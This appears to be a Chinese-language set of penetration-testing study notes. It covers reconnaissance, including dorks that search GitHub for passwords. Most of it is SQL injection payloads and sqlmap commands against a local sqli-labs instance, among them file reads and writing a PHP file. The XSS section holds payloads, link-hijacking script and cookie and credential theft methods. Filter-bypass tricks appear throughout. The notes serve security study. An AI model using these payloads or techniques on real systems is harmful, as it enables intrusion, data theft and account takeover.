# 渗透指南

## 信息搜集

目标：域名，ip地址，目标服务器系统，数据库类型与版本，中间件系统，应用程序系统，边界设备，管理员账户

### 域名搜集

whois信息

#### ICP备案信息查询

`<http://www.beianbeian.com/>`

#### 子域名收集

##### 子域名爆破工具

maltego

[wydomain](https://github.com/brianwrf/wydomain )

[subdomain3](https://github.com/yanxiu0614/subdomain3 )

##### 搜索引擎

使用google：site 51cto.com

##### 第三方网站

站长之家<https://tool.chinaz.com/subdomain>

![1595753070661](assets/1595753070661.png)

https://dnsdumpster.com

##### 证书透明度公开日志枚举

https://crt.sh/

https://censys.io/

##### 其他途径

https://phpinfo.me/domain

http://dns.aizhan.com

### cms网站信息搜集

CMS指纹识别<http://whatweb.bugscaner.com/look/>

云悉<https://www.yunsee.cn/>

cms漏洞查询

#### web目录枚举

dirb

dirbuster

### 端口扫描

nmap

### 敏感信息

#### 使用搜索引擎

<https://www.exploit-db.com/google-hacking-database>



#### 使用github

site: github.com sa password

site: github.com root password

site: github.com userId Password

### ip地址

#### 判断cdn服务器

使用ping

绕过cdn

通过viewdns网站查询ip。

如果直接访问ip无法取得结果，说明是cdn，否则是正常ip



## 漏洞原理与工具

### sql注入

实验环境  sqli-lab,可使用docker镜像启动。

#### 基于错误

当输入异常查询内容时，web接口给出错误，此时拼接sql，达到查询额外信息的目的

![1593157402998](assets/1593157402998.png)

推测原始sql查询语句

```sql
select username,information from some_table where id='id' limit 0,1;
```

输入的内容放入id中，通过在输入内容后加上单引号闭合原语句，添加union语句查询新内容，再使用注释语法注释掉后续内容，达到sql注入的目的

sqlmap的technique参数可以指定探测技术

![1593159578996](assets/1593159578996.png)

B表示布尔，E表示错误，U表示union，T表示时间

#### 基于bool的盲注

闭合id后，通过and添加其他的判断条件

http://localhost:8081/Less-8/?id=1‘ and length(database())=8 --+>

#### 基于时间

if(ascii(substr(database(),1,1)) =115, 1, sleep(3))

当数据库名第一个字母的ascii码等于115时，执行一次sleep（3）等待3秒

localhost:8081/Less-9/?id=1’ and if(1=0,1,sleep(5)) –+

mysql中的if语句

if(exp1,exp2,exp3)当exp1为真，返回exp2，否则返回exp3

#### post 注入

当某个post参数存在sql注入，需要使用burpsuite测试，拦截到请求后，保存到某个文件，

![1593430437777](assets/1593430437777.png)

使用

```
sqlmap -r request.txt --batch
```

检测参数。另外也可以使用-p参数指定要测试的参数。

#### http header 注入

http头信息如果参与了数据库查询，也可以用来进行测试，保存request信息，将要测试的头信息替换为*，

![1593430591468](assets/1593430591468.png)

随后使用sqlmap测试

#### update注入

updatexml函数

```
uname=admin&passwd=admin' or updatexml(1, concat(0x7e,(select database()), 0x7e),1) and '1' = '1 &submit=Submit
```

当passwd参数存在sql注入，可以使用updatexml进行查询操作

#### cookie注入

cookie条目参与sql执行，未过滤也会产生sql注入

![1593431633579](assets/1593431633579.png)

![1593431647182](assets/1593431647182.png)

使用sqlmap时，同样的把对应cookie的值设置为*,执行sqlmap即可

![1593431798760](assets/1593431798760.png)

cookie有可能使用了base64编码，测试时使用编码后的sql语句即可

![1593432622657](assets/1593432622657.png)

![1593432609879](assets/1593432609879.png)

![1593432640961](assets/1593432640961.png)

当sqlmap测试base64编码过的sql注入时，需要指定tamper参数

```
sqlmap -r request.txt --batch --tamper base64encode
```

可用的tamper在

/usr/share/sqlmap/tamper/

目录下

#### 利用sql注入读写文件

##### 读取

load_file可以读取文件内容

比如

```sql
select load_file("/run.sh");
```

![1593160649765](assets/1593160649765.png)

注入时，使用

http://localhost:8081/Less-1/?id=-1’ union select 1,load_file(“/run.sh”),3 –+

![1593160739742](assets/1593160739742.png)

sqlmap的–read-file 可以指定读取文件

##### 写入

写入文件要求mysql进程用户对目标目录有读写权限，



http://localhost:8081/Less-1/?id=-1’ union select  1,’<?php phpinfo();?>‘,3 into outfile ‘/app/phpinfo.php’ –+                                                                                                                                                                      

![1593161976662](assets/1593161976662.png)

可访问如下

![1593161992827](assets/1593161992827.png)

sqlmap的write-file dest-file指定写入文件

```shell
sqlmap -u http://localhost:8081/Less-1/?id=7  --batch --file-write script/ssproxy.sh --file-dest /app/test.sh
```



##### 写入webshell

一句话木马与中国菜刀

#### 绕过

##### 注释符

preg_replace(mixed \$pattern, mixed \$replacement, mixed \$subject)

执行正则表达式搜索与替换

这个函数常用来执行sql语句字符替换

如果绕过了注释，需要我们构造语法手动闭合单引号，比如

or ‘1’ = ‘1

##### and 与 or

![1593505348402](assets/1593505348402.png)

大小写变形Or，在敏感词中间加注释a/* test */nd，利用符号代替||，双写绕过oorr

##### 空格

使用url编码

![1593505932204](assets/1593505932204.png)

使用sqlmap测试时指定hex选项，

```
sqlmap -u 'url' --hex --dbs
```

##### union select

大小写、双写，使用||表示or

##### 转义

宽字节注入，

转义时会在特殊字符前加上\,表示后面跟的字符是正常字符

![1593506877759](assets/1593506877759.png)

![1593506944268](assets/1593506944268.png)

sqmap使用宽字节注入时，使用–tamper unmagicquotes选项

#### 二次注入

### sqlmap工具

#### 直连数据库

```shel
sqlmap -d "mysql://root:wodemima@127.0.0.1:3306/security" -f  --dbs
```

#### 检测单一url

使用-u参数

#### 读取文件目标

![1593759236846](assets/1593759236846.png)

#### google hack



#### 使用配置文件

### XSS

#### 盗取cookie

使用document.location重定向网页，使用document.cookie获取本地cookie

访问目标网址（黑客编写的恶意网页），获取cookie，利用获取到的cookie，登录原网站

#### 篡改链接

```js
window.onload = function () {
    var link = document.getElementsByTagName("a");
    for (var j = 0; j < link.length; j++) {
        link[j].href = "http://www.baidu.com";
    }
};
```

使网页链接执行某个恶意链接，用于恶意重定向，刷流量等

#### 盗取用户信息

在登录页注入xss，重定向到恶意镜像站点，存储用户输入的凭据

使用工具 setoolkit跳转网站

#### 探测方法

使用网站https://xss-quiz.int21h.jp进行测试

在用户输入的地方输入正常字符，在开发者页面查找，该字符串是否输出到了页面，如果有，就可能存在xss漏洞。

闭合文本标签

最简单的payload是alert

有时输出的内容被包含在特定的字符中，需要我们做一些其他的操作

```js
"<script>alert(document.domain);</script>" // 闭合前后的双引号
</b>....
```

#### 基于属性的xss

引入script

![1594110224061](assets/1594110224061.png)

![1594110243970](assets/1594110243970.png)

引入事件

```js
" onmouseover=alert(document.domain)>
```

#### 选择列表中的xss

有时输入框中内容被过滤，可以使用burpsuite拦截http请求，修改option内容，闭合网页option标签，引入script

![image-20200707171252086](assets/image-20200707171252086.png)

```js
</option><script>alert(document.domain);</script>
```

![image-20200707170908589](assets/image-20200707170908589.png)

#### 隐藏表单中的XSS

![image-20200707172001798](assets/image-20200707172001798.png)

```js
 p1=111111&p2=Japan&p3=hackme"/> <svg onload="alert(document.domain)"/>
```

当script被过滤，svg是一个很好的选择。svg的onload事件中注入js事件代码



#### 限制输入长度的xss

可以使用浏览器调试界面直接修改max_length限制，也可以使用burpsuite截取网络请求的方式突破长度限制

#### html事件中的xss

与属性中的xss相同，可以选择闭合属性或闭合标签，添加payload代码

#### 空格分隔的xss

#### JavaScript伪协议触发

#### 绕过思路

##### 双写

比如domain字符串被过滤，那么dodomainmain被过滤后，依然是domain

##### 编码绕过

```js
"><script>eval(atob('payload'));</script>
```

payload为base64加密过的字符串

##### 关键字被过滤

尝试伪协议、空格

##### css特性

#### xss检测工具

xsser

xsstrike

### CSRF

csrftester

burpsuite

### SSRF

服务端请求伪造

原理是，web服务器接收前端用户给出的URL链接，访问该url的内容，由于web服务器具有访问内网的权限，造成信息泄露。

可以用于访问内网资源，使用file协议读取敏感文件，进行内网信息探测等

### XXE

XML外部实体注入，当xml未限制引入的外部实体，可能导致文件读取、敏感信息泄露

### 命令执行



## 漏洞扫描工具

### OpenVAS





